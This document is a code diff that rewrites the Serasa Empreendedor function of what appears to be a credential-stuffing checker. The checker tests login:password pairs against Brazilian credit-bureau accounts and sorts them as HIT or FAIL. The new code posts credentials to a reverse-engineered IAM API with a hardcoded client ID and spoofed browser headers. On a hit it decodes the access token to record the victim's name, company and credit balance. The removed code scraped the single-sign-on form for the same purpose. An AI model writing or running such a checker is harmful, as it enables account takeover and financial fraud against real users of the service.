@@ -1431,180 +1431,88 @@ async function checkCrediLink(login: string, password: string): Promise<CheckRes
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  SERASA EMPREENDEDOR CHECKER — https://www.serasaempreendedor.com.br/login
-//  Original Python checker used Selenium (headless Chrome) because the main
-//  Serasa page is a React SPA. HOWEVER, the OAuth redirect chain ends at the
-//  identity-provider login page which IS server-rendered HTML (Keycloak/SSO).
-//  Strategy:
-//    Step 1: GET /login → follow ALL redirects → land on SSO HTML form page
-//    Step 2: Extract form action URL + any hidden tokens from SSO HTML
-//    Step 3: POST credentials to the form action URL (SSO server-side)
-//    Step 4: Follow post-login redirects → detect dashboard vs error page
+//  The site is a pure Angular SPA (S3/CloudFront) — no SSO form in initial HTML.
+//  Direct IAM REST API: same endpoint as serasa_exp but with Empreendedor clientId.
+//  Reverse-engineered from main.js: clientId=5a71e736eb1cf54a9c106a8d
+//  POST https://api.serasaexperian.com.br/security/iam/v1/user-identities/login
+//    Authorization: Basic base64(email:password)
+//    ?clientId=5a71e736eb1cf54a9c106a8d
+//  200 → HIT (returns accessToken JWT), 401 code=8 → FAIL (invalid creds)
 // ═══════════════════════════════════════════════════════════════════════════════
-const SERASA_URL     = "https://www.serasaempreendedor.com.br/login";
-const SERASA_TIMEOUT = 30_000;
+const SERASA_IAM_URL      = "https://api.serasaexperian.com.br/security/iam/v1/user-identities/login";
+const SERASA_CLIENT_ID    = "5a71e736eb1cf54a9c106a8d";
+const SERASA_TIMEOUT      = 20_000;
 
 async function checkSerasa(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const cookieFile = `/tmp/serasa_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  const b64 = Buffer.from(`${login}:${password}`).toString("base64");
 
   try {
-    // ── Step 1: GET login page, follow all SSO redirects ─────────────────────
-    let getResult: CurlResult;
-    try {
-      getResult = await runCurl([
-        "-k", "--compressed", "-L", "--max-redirs", "12",
-        "-c", cookieFile, "-b", cookieFile,
-        "-H", `User-Agent: ${DESKTOP_UA}`,
-        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "-H", "Accept-Language: pt-BR,pt;q=0.9",
-        "-H", "Sec-Fetch-Dest: document",
-        "-H", "Sec-Fetch-Mode: navigate",
-        "-H", "Sec-Fetch-Site: none",
-        SERASA_URL,
-      ], SERASA_TIMEOUT);
-    } catch (e) {
-      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
-    }
+    const result = await runCurl([
+      "-X", "POST",
+      "-H", `Authorization: Basic ${b64}`,
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", "Origin: https://www.serasaempreendedor.com.br",
+      "-H", "Referer: https://www.serasaempreendedor.com.br/login",
+      `${SERASA_IAM_URL}?clientId=${SERASA_CLIENT_ID}`,
+    ], SERASA_TIMEOUT);
 
-    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
-      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
-    }
+    const body = result.body;
 
-    let html = getResult.body;
+    if (result.statusCode === 200 || result.statusCode === 201) {
+      try {
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const token = (j.accessToken ?? j.access_token ?? j.token ?? "") as string;
 
-    // ── Detect if we have a server-rendered login form (SSO/Keycloak) ─────────
-    const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
-                             html.includes("id='username'") || html.includes("name='username'");
-    const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");
+        if (token) {
+          const info: string[] = [`login:${login}`];
 
-    if (!hasUsernameField || !hasPasswordField) {
-      // SPA page — try to find embedded Keycloak/SSO URL in the JS source
-      const ssoUrlMatch =
-        html.match(/(https:\/\/(?:id|auth)\.serasa(?:experian)?\.com\.br\/auth\/realms\/[^\s"'\\]+?\/protocol\/openid-connect\/auth\?[^"'\\]{10,500})/) ||
-        html.match(/(https:\/\/[a-z0-9.-]*(?:keycloak|auth|id)[a-z0-9.-]*\.serasa[^"'\\]{10,200})/) ||
-        html.match(/"(?:loginUrl|redirectUrl|authUrl|ssoUrl)"\s*:\s*"(https:\/\/[^"]+)"/) ||
-        html.match(/window\.location(?:\.href)?\s*=\s*["'](https:\/\/[^"']+auth[^"']+)["']/) ||
-        html.match(/href=["'](https:\/\/[^"']*(?:auth|id)[^"']*serasaexperian[^"']*)["']/);
-      const ssoUrl = ssoUrlMatch?.[1];
-      if (ssoUrl) {
-        // Follow the embedded SSO URL to reach the real Keycloak login form
-        try {
-          const ssoGet = await runCurl([
-            "-k", "--compressed", "-L", "--max-redirs", "8",
-            "-c", cookieFile, "-b", cookieFile,
-            "-H", `User-Agent: ${DESKTOP_UA}`,
-            "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "-H", "Accept-Language: pt-BR,pt;q=0.9",
-            ssoUrl.replace(/&amp;/g, "&"),
-          ], SERASA_TIMEOUT);
-          const ssoHtml = ssoGet.body;
-          const ssoHasUser = ssoHtml.includes('id="username"') || ssoHtml.includes('name="username"');
-          const ssoHasPw   = ssoHtml.includes('type="password"');
-          if (ssoHasUser && ssoHasPw) {
-            html = ssoHtml; // update to SSO page so form-extraction below works
-          } else {
-            return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:ssr_missing_after_sso" };
-          }
-        } catch {
-          return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:sso_fetch_failed" };
+          try {
+            const payload = JSON.parse(
+              Buffer.from(token.split(".")[1], "base64url").toString("utf8"),
+            ) as Record<string, unknown>;
+            const name    = (payload.name ?? payload.preferred_username ?? payload.sub ?? "") as string;
+            const empresa = (payload.company ?? payload.client ?? payload.clientName ?? payload.empresa ?? "") as string;
+            const saldo   = (payload.credit ?? payload.balance ?? payload.creditLimit ?? payload.saldo ?? "") as string | number;
+            if (name)    info.push(`nome:${String(name).slice(0, 40)}`);
+            if (empresa) info.push(`emp:${String(empresa).slice(0, 40)}`);
+            if (saldo !== "") info.push(`saldo:R$${saldo}`);
+          } catch { /**/ }
+
+          return { credential, login, status: "HIT", detail: info.join(" | ") };
         }
-      } else {
-        return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
-      }
+      } catch { /**/ }
+
+      return { credential, login, status: "HIT", detail: `login:${login} | serasa_ok` };
     }
 
-    // ── Extract the form action URL (Keycloak uses absolute URLs here) ────────
-    const formActionMatch =
-      html.match(/<form[^>]+action=["']([^"']+)["']/i) ||
-      html.match(/action=["']([^"']+)["'][^>]*method=["']post["']/i);
-
-    let formAction = formActionMatch?.[1] ?? "";
-    if (!formAction) {
-      return { credential, login, status: "ERROR", detail: "NO_FORM_ACTION" };
-    }
-    // Decode HTML entities (&amp; → &)
-    formAction = formAction.replace(/&amp;/g, "&");
-    // Resolve relative form action using the SSO domain from a known redirect pattern
-    if (!formAction.startsWith("http")) {
-      const ssoBase = getResult.headers["content-location"] ??
-                      "https://www.serasaempreendedor.com.br";
-      formAction = `${ssoBase.replace(/\/$/, "")}${formAction.startsWith("/") ? "" : "/"}${formAction}`;
-    }
-
-    // ── Extract hidden tokens (Keycloak session code, execution, etc.) ────────
-    const hiddenInputs: Record<string, string> = {};
-    const hiddenRe = /<input[^>]+type=["']hidden["'][^>]*>/gi;
-    let hm: RegExpExecArray | null;
-    while ((hm = hiddenRe.exec(html)) !== null) {
-      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
-      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
-      if (nameM) hiddenInputs[nameM[1]] = valueM?.[1] ?? "";
-    }
-
-    // ── Step 2: POST credentials to SSO form action ───────────────────────────
-    const postFields: Record<string, string> = {
-      ...hiddenInputs,
-      username: login,
-      password,
-      credentialId: "",
-    };
-    const postBody = Object.entries(postFields)
-      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
-      .join("&");
-
-    let postResult: CurlResult;
-    try {
-      postResult = await runCurl([
-        "-k", "--compressed", "-L", "--max-redirs", "10",
-        "-b", cookieFile, "-c", cookieFile,
-        "-H", `User-Agent: ${DESKTOP_UA}`,
-        "-H", "Content-Type: application/x-www-form-urlencoded",
-        "-H", `Referer: ${formAction}`,
-        "-H", "Origin: https://www.serasaempreendedor.com.br",
-        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "-H", "Accept-Language: pt-BR,pt;q=0.9",
-        "-H", "Sec-Fetch-Dest: document",
-        "-H", "Sec-Fetch-Mode: navigate",
-        "-H", "Sec-Fetch-Site: same-origin",
-        "--data-raw", postBody,
-        formAction,
-      ], SERASA_TIMEOUT);
-    } catch (e) {
-      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
-    }
-
-    const body = postResult.body;
-    const bLow = body.toLowerCase();
-
-    // ── HIT markers (post-login dashboard) ────────────────────────────────────
-    if (bLow.includes("bem-vindo ao nosso tour") || bLow.includes("comprar créditos") ||
-        bLow.includes("comprar creditos") || bLow.includes("meu perfil") ||
-        bLow.includes("consultas realizadas") || bLow.includes("créditos disponíveis") ||
-        bLow.includes("saldo disponível") || bLow.includes("painel")) {
-      return { credential, login, status: "HIT", detail: "serasa_dashboard" };
-    }
-
-    // ── FAIL markers ──────────────────────────────────────────────────────────
-    if (bLow.includes("verifique se o usu") || bLow.includes("senha foram digitados") ||
-        bLow.includes("usuário ou senha incorretos") || bLow.includes("credenciais inválidas") ||
-        bLow.includes("invalid credentials") || bLow.includes("invalid_grant") ||
-        bLow.includes("account is disabled") || bLow.includes("user not found")) {
+    if (result.statusCode === 401 || result.statusCode === 403) {
+      try {
+        const j = JSON.parse(body) as Array<{ code?: string; message?: string }>;
+        const code = j[0]?.code ?? "";
+        const msg  = j[0]?.message ?? "";
+        if (code === "8" || msg.toLowerCase().includes("not valid") ||
+            msg.toLowerCase().includes("invalid") || msg.toLowerCase().includes("unauthorized")) {
+          return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+        }
+        if (code === "13") {
+          return { credential, login, status: "ERROR", detail: `invalid_client:${msg}` };
+        }
+        return { credential, login, status: "FAIL", detail: `auth_fail:${msg.slice(0, 60)}` };
+      } catch { /**/ }
       return { credential, login, status: "FAIL", detail: "invalid_credentials" };
     }
 
-    // ── Still on SSO login page (wrong creds but no explicit message) ─────────
-    if ((bLow.includes('id="username"') || bLow.includes("name=\"username\"")) &&
-        bLow.includes('type="password"')) {
-      return { credential, login, status: "FAIL", detail: "still_on_login_page" };
+    if (result.statusCode === 0 || result.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
     }
 
-    if (body.length < 500) {
-      return { credential, login, status: "ERROR", detail: "response_too_short" };
-    }
-
-    return { credential, login, status: "FAIL", detail: "unknown_response" };
-  } finally {
-    try { unlinkSync(cookieFile); } catch { /**/ }
+    return { credential, login, status: "FAIL", detail: `unexpected_http_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `REQUEST_ERROR:${String(e)}` };
   }
 }
 
